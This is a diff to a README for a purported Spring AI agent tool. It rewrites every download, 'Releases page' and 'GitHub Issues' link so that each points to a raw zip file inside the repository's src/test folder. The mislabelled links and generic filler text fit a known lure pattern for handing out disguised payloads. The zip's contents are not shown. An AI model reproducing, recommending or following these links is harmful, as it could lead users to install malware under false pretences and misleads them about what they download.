@@ -1,7 +1,7 @@
 # 🤖 spring-ai-reflection-agent - A Simple Way to Build Smart Agents
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/resources/reflection-ai-agent-spring-3.3.zip%20GitHub-brightgreen)](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/resources/reflection-ai-agent-spring-3.3.zip)
+[![Download](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/agent_ai_reflection_spring_2.3.zip%20GitHub-brightgreen)](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/agent_ai_reflection_spring_2.3.zip)
 
 ## 📖 Overview
 The spring-ai-reflection-agent is a Java application designed to create intelligent agents easily. It uses Spring AI 2.0 to make building these agents straightforward. With this tool, you can explore advanced techniques in AI without needing to understand complex programming languages or tools.
@@ -18,7 +18,7 @@ To start using the spring-ai-reflection-agent, follow these simple instructions.
 2. **Visit the Download Page**
    You can download the application from our Releases page. Click the link below:
 
-   [Download here](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/resources/reflection-ai-agent-spring-3.3.zip)
+   [Download here](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/agent_ai_reflection_spring_2.3.zip)
 
 3. **Choose Version to Download**
    On the Releases page, you will see different versions of the spring-ai-reflection-agent. Pick the latest one for the best features and fixes.
@@ -86,9 +86,9 @@ If you encounter any issues, here are some common solutions:
 - **Installation Errors**: Check your permissions to install software on your device.
 
 ## 🌐 Support
-If you need further assistance, feel free to reach out via [GitHub Issues](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/resources/reflection-ai-agent-spring-3.3.zip) or check our FAQs for quick answers.
+If you need further assistance, feel free to reach out via [GitHub Issues](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/agent_ai_reflection_spring_2.3.zip) or check our FAQs for quick answers.
 
 ## 📦 Conclusion
 The spring-ai-reflection-agent offers a straightforward way to interact with AI technology. By following these steps, you can easily download, install, and start using the application. 
 
-Before you go, don’t forget to visit the download page again to access updates and new versions: [Download here](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/resources/reflection-ai-agent-spring-3.3.zip).
+Before you go, don’t forget to visit the download page again to access updates and new versions: [Download here](https://raw.githubusercontent.com/Edii99/spring-ai-reflection-agent/main/src/test/agent_ai_reflection_spring_2.3.zip).
